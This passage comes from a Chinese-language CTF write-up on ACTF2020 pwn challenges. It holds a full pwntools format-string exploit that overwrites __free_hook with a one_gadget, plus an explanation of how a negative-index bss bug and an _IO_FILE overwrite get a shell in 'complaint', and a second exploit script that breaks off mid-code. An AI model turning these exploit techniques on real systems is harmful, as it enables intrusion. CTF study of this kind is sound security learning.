<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./fmt64'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span><span class="params">(pos)</span>:</span></span><br><span class="line">    sl(<span class="string">'LLLLLLLL%%%d$p'</span>%(pos))</span><br><span class="line">    <span class="keyword">return</span> rc()[<span class="number">8</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"%10$s"</span>.ljust(<span class="number">24</span>,<span class="string">'S'</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">return</span> rc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_byte</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> data==<span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"%10$hhn"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"%%%dc%%10$hhn"</span>%(data)</span><br><span class="line">    payload = payload.ljust(<span class="number">24</span>,<span class="string">'T'</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">return</span> rc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_dw</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    alter_byte(addr,data&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">1</span>,(data&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">2</span>,(data&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">3</span>,(data&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_qw</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    alter_dw(addr,data)</span><br><span class="line">    alter_dw(addr+<span class="number">4</span>,data&gt;&gt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flush</span><span class="params">(c=<span class="string">'F'</span>)</span>:</span></span><br><span class="line">    sl(c*<span class="number">8</span>+<span class="string">'\0'</span>*<span class="number">0x80</span>)</span><br><span class="line">    rc()</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">ru(<span class="string">'This\'s my mind!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line"><span class="keyword">if</span> is_remote:</span><br><span class="line">    offset___libc_start_main_ret = <span class="number">0x20830</span></span><br><span class="line">    offset_one_gadget = <span class="number">0xf02a4</span>  <span class="comment"># execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="keyword">if</span> is_local:</span><br><span class="line">    offset___libc_start_main_ret = <span class="number">0x26b6b</span></span><br><span class="line">    offset_one_gadget = <span class="number">0x106ef8</span> <span class="comment"># execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"></span><br><span class="line">libc_base = int(leak_addr(<span class="number">46</span>),<span class="number">16</span>)-offset___libc_start_main_ret</span><br><span class="line">info_addr(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">info_addr(<span class="string">'free_hook'</span>,free_hook)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + offset_one_gadget</span><br><span class="line">info_addr(<span class="string">'one_gadget'</span>,one_gadget)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'write one_gadget to free_hook'</span>)</span><br><span class="line">alter_qw(free_hook, one_gadget)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">"%100000c"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>我太菜了…T^T</p>
</blockquote>
<h2 id="Complaint"><a href="#Complaint" class="headerlink" title="Complaint"></a>Complaint</h2><ul>
<li>题目描述：尽情地Make Complaints！</li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/complaint/complaint" target="_blank" rel="noopener">complaint</a></li>
<li>考察点：Off-by-one（官方）、覆盖_IO_FILE（非预期）</li>
<li>难度：中等</li>
<li>分值：200</li>
<li>完成人数：4</li>
</ul>
<p>显然是个堆的题，然鹅我并不会利用，看了一下，还有别的漏洞，于是硬是给解出来了…</p>
<p>主要的漏洞如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">mod</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The complaint index you want to modify:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Input your complaint:"</span>, &amp;v1);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, ptr[v1], *(&amp;n + v1));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The complaint index you want to show:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your complaint: "</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, ptr[v1], *(&amp;n + v1));</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_400FF7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>mod()</code>函数用于修改<code>ptr[v1]</code>中的内容，<code>show()</code>用于打印<code>ptr[v1]</code>的内容</p>
<p>这个<code>ptr</code>在<code>bss</code>段，<code>v1</code>通过<code>scanf</code>读入，可以是负数，所以只要顺着<code>ptr</code>往上找，找到<code>ptr[v1]</code>不为零的内存区域，就可以触发<code>read/write</code>函数；<br><code>read/write</code>函数的第三个参数是<code>n[v1]</code>，<code>n</code>也是在<code>bss</code>段，所以只要顺着<code>n</code>往上找，找到<code>n[v1]</code>不为零的内存区域，就可以通过<code>read/write</code>，往<code>ptr[v1]</code>中读一坨数据或是从其中泄漏一坨数据。</p>
<p><code>bss</code>段数据的布局如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A0 ; FILE *stdout</span><br><span class="line">.bss:00000000006020A0 stdout          dq ?                    </span><br><span class="line">.bss:00000000006020B0 ; FILE *stdin</span><br><span class="line">.bss:00000000006020B0 stdin           dq ?                    </span><br><span class="line">.bss:00000000006020C0 ; FILE *stderr</span><br><span class="line">.bss:00000000006020C0 stderr          dq ?                    </span><br><span class="line">.bss:00000000006020C8 byte_6020C8     db ?                    </span><br><span class="line">.bss:00000000006020E0 ; char *src</span><br><span class="line">.bss:00000000006020E0 src             dq ?                    </span><br><span class="line">.bss:0000000000602100 ; size_t n</span><br><span class="line">.bss:0000000000602100 n               dd ?                    </span><br><span class="line">.bss:0000000000602140 ; char *ptr[16]</span><br><span class="line">.bss:0000000000602140 ptr             dq ?</span><br></pre></td></tr></table></figure></div>

<p>这题巧了，当<code>v1=-16</code>时：</p>
<blockquote>
<p><code>ptr[v1]</code>=<code>0x602140+8*(-16)</code>=<code>0x6020c0(stderr)</code>指向<code>_IO_2_1_stderr_</code><br><code>n[v1]</code>=<code>0x602100+4*(-16)</code>=<code>0x6020c0</code>也指向<code>_IO_2_1_stderr_</code>，其中的值<code>flags=0xfbad2087</code></p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/xg 0x6020c0</span></span><br><span class="line">0x6020c0 &lt;stderr&gt;:	0x00007fce72a43540</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/xg stderr</span></span><br><span class="line">0x7fce72a43540 &lt;_IO_2_1_stderr_&gt;:	0x00000000fbad2087</span><br></pre></td></tr></table></figure></div>

<p>于是，<code>mod(-16)</code>可以向<code>_IO_2_1_stderr_</code> 写入<code>0xfbad2087</code>字节数据，用于覆盖<code>_IO_FILE</code>结构体</p>
<p><code>show(-16)</code>可以从<code>_IO_2_1_stderr_</code>读出<code>0xfbad2087</code>字节数据，用于泄漏libc</p>
<p><code>_IO_2_1_stderr_</code>其后的内存分布如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;200xg 0x7fce72a43540</span><br><span class="line">0x7fce72a43540 &lt;_IO_2_1_stderr_&gt;:	0x00000000fbad2087	0x00007fce72a435c3</span><br><span class="line">0x7fce72a43550 &lt;_IO_2_1_stderr_+16&gt;:	0x00007fce72a435c3	0x00007fce72a435c3</span><br><span class="line">0x7fce72a43560 &lt;_IO_2_1_stderr_+32&gt;:	0x00007fce72a435c3	0x00007fce72a435c3</span><br><span class="line">0x7fce72a43570 &lt;_IO_2_1_stderr_+48&gt;:	0x00007fce72a435c3	0x00007fce72a435c3</span><br><span class="line">0x7fce72a43580 &lt;_IO_2_1_stderr_+64&gt;:	0x00007fce72a435c4	0x0000000000000000</span><br><span class="line">0x7fce72a43590 &lt;_IO_2_1_stderr_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fce72a435a0 &lt;_IO_2_1_stderr_+96&gt;:	0x0000000000000000	0x00007fce72a43620</span><br><span class="line">0x7fce72a435b0 &lt;_IO_2_1_stderr_+112&gt;:	0x0000000000000002	0xffffffffffffffff</span><br><span class="line">0x7fce72a435c0 &lt;_IO_2_1_stderr_+128&gt;:	0x0000000000000000	0x00007fce72a44770</span><br><span class="line">0x7fce72a435d0 &lt;_IO_2_1_stderr_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7fce72a435e0 &lt;_IO_2_1_stderr_+160&gt;:	0x00007fce72a42660	0x0000000000000000</span><br><span class="line">0x7fce72a435f0 &lt;_IO_2_1_stderr_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fce72a43600 &lt;_IO_2_1_stderr_+192&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fce72a43610 &lt;_IO_2_1_stderr_+208&gt;:	0x0000000000000000	0x00007fce72a416e0</span><br><span class="line">0x7fce72a43620 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad2887	0x00007fce72a436a3</span><br><span class="line">0x7fce72a43630 &lt;_IO_2_1_stdout_+16&gt;:	0x00007fce72a436a3	0x00007fce72a436a3</span><br><span class="line">0x7fce72a43640 &lt;_IO_2_1_stdout_+32&gt;:	0x00007fce72a436a3	0x00007fce72a436a3</span><br><span class="line">0x7fce72a43650 &lt;_IO_2_1_stdout_+48&gt;:	0x00007fce72a436a3	0x00007fce72a436a3</span><br><span class="line">0x7fce72a43660 &lt;_IO_2_1_stdout_+64&gt;:	0x00007fce72a436a4	0x0000000000000000</span><br><span class="line">0x7fce72a43670 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fce72a43680 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007fce72a428e0</span><br><span class="line">0x7fce72a43690 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff</span><br><span class="line">0x7fce72a436a0 &lt;_IO_2_1_stdout_+128&gt;:	0x000000000a000000	0x00007fce72a44780</span><br><span class="line">0x7fce72a436b0 &lt;_IO_2_1_stdout_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7fce72a436c0 &lt;_IO_2_1_stdout_+160&gt;:	0x00007fce72a427a0	0x0000000000000000</span><br><span class="line">0x7fce72a436d0 &lt;_IO_2_1_stdout_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fce72a436e0 &lt;_IO_2_1_stdout_+192&gt;:	0x00000000ffffffff	0x0000000000000000</span><br><span class="line">0x7fce72a436f0 &lt;_IO_2_1_stdout_+208&gt;:	0x0000000000000000	0x00007fce72a416e0</span><br><span class="line">0x7fce72a43700 &lt;stderr&gt;:	0x00007fce72a43540	0x00007fce72a43620</span><br><span class="line">0x7fce72a43710 &lt;stdin&gt;:	0x00007fce72a428e0	0x00007fce7269eb70</span><br></pre></td></tr></table></figure></div>

<p><code>read</code>读的数据足以修改<code>_IO_2_1_stdout_</code>的<code>_IO_FILE</code>结构体</p>
<p><code>write</code>打印的数据足以泄漏<code>stderr</code>中的<code>_IO_2_1_stderr_</code>地址</p>
<blockquote>
<p><code>_IO_2_1_stderr_</code>在libc中</p>
</blockquote>
<p>利用的思路很简单，先<code>show(-16)</code>泄漏libc，再<code>mod(-16)</code>覆盖<code>_IO_2_1_stdout_</code>的<code>_IO_FILE</code>结构体，<code>mod</code>函数执行完毕后会调用<code>puts</code>打印菜单，于是会用到<code>_IO_2_1_stdout_</code>，只要把其中的函数指针改写为<code>one_gadget</code>即可getshell</p>
<p>关于<code>_IO_FILE</code>结构体，<a href="https://xz.aliyun.com/t/3344" target="_blank" rel="noopener">这篇</a>文章有介绍，讲的比较明白</p>
<p>我的做法就比较简单粗暴了……直接跟进<code>puts</code>函数，通过漏洞布置合适的数据，让程序顺利执行到这里：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  0x7fce726ed788 &lt;puts+248&gt;    cmp    eax, -1</span><br><span class="line">  0x7fce726ed78b &lt;puts+251&gt;    je     puts+152 &lt;0x7fce726ed728&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x7fce726ed728 &lt;puts+152&gt;    mov    rax, qword ptr [rdi + 0xd8]</span><br><span class="line">  0x7fce726ed72f &lt;puts+159&gt;    mov    rdx, rbx</span><br><span class="line">  0x7fce726ed732 &lt;puts+162&gt;    mov    rsi, r12</span><br><span class="line">► 0x7fce726ed735 &lt;puts+165&gt;    call   qword ptr [rax + 0x38] &lt;0x7fce726f71e0&gt;</span><br></pre></td></tr></table></figure></div>

<p>这里的<code>rax + 0x38</code>是可以覆盖到的，向其中布置<code>one_gadget</code>即可</p>
<blockquote>
<p>由于不同<code>libc</code>版本的<code>puts</code>函数具体代码不同，但是大同小异<br>我本地环境是<code>libc_2.29</code>，这题远程的环境是<code>libc_2.23</code>，都可以用上述方法成功getshell</p>
</blockquote>
<p>exp如下(调试<code>libc_2.23</code>时需要<code>Ubuntu16.04</code>环境~真香)：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./complaint'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 